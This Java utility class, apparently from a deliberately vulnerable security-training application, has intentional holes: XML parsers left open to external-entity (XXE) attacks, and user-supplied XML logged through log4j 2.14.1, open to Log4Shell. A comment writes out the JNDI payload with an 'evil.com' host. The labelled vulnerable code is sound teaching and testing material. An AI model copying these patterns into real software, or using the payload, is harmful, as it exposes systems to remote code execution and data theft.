package org.sasanlabs.shared.util;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import javax.xml.transform.Transformer;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.stream.StreamResult;
import java.io.ByteArrayInputStream;
import java.io.StringWriter;
import java.nio.charset.StandardCharsets;

import org.w3c.dom.Document;

/**
 * XML Helper with intentional XXE and Log4Shell vulnerabilities.
 * Pattern 1: XXE-permissive defaults.
 * Pattern 5: Uses log4j-core 2.14.1 — Log4Shell (CVE-2021-44228).
 */
public class XMLHelper {

    // VULNERABLE: Logger using log4j-core 2.14.1 — JNDI lookup enabled by default
    private static final Logger logger = LogManager.getLogger(XMLHelper.class);

    /**
     * Parses XML string to Document.
     * VULNERABLE: No XXE protections — external entities and DTDs are allowed.
     */
    public static Document parseXML(String xml) throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        // Intentionally NOT setting:
        // factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        // factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        // factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        DocumentBuilder builder = factory.newDocumentBuilder();
        return builder.parse(new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)));
    }

    /**
     * Parses XML with SAX parser.
     * VULNERABLE: Same XXE issues as parseXML, plus SAX-specific entity expansion attacks.
     */
    public static SAXParser createSAXParser() throws Exception {
        SAXParserFactory factory = SAXParserFactory.newInstance();
        // Intentionally NOT disabling external entities
        return factory.newSAXParser();
    }

    /**
     * Converts Document back to XML string.
     */
    public static String documentToString(Document doc) throws Exception {
        TransformerFactory tf = TransformerFactory.newInstance();
        Transformer transformer = tf.newTransformer();
        StringWriter writer = new StringWriter();
        transformer.transform(new DOMSource(doc), new StreamResult(writer));
        return writer.toString();
    }

    /**
     * Logs XML parsing errors.
     * VULNERABLE: Logs the XML content directly — if XML contains ${jndi:ldap://evil.com/x},
     * Log4j 2.14.1 will perform JNDI lookup (Log4Shell, CVE-2021-44228).
     */
    public static void logParsingError(String xmlContent, Exception error) {
        // VULNERABLE: User-controlled xmlContent logged directly through Log4j
        logger.error("Failed to parse XML content: " + xmlContent, error);
    }

    /**
     * Validates XML structure by attempting to parse it.
     * VULNERABLE: Logs input on failure — Log4Shell vector.
     */
    public static boolean isValidXML(String xml) {
        try {
            parseXML(xml);
            return true;
        } catch (Exception e) {
            // VULNERABLE: logs user-supplied XML content
            logParsingError(xml, e);
            return false;
        }
    }
}
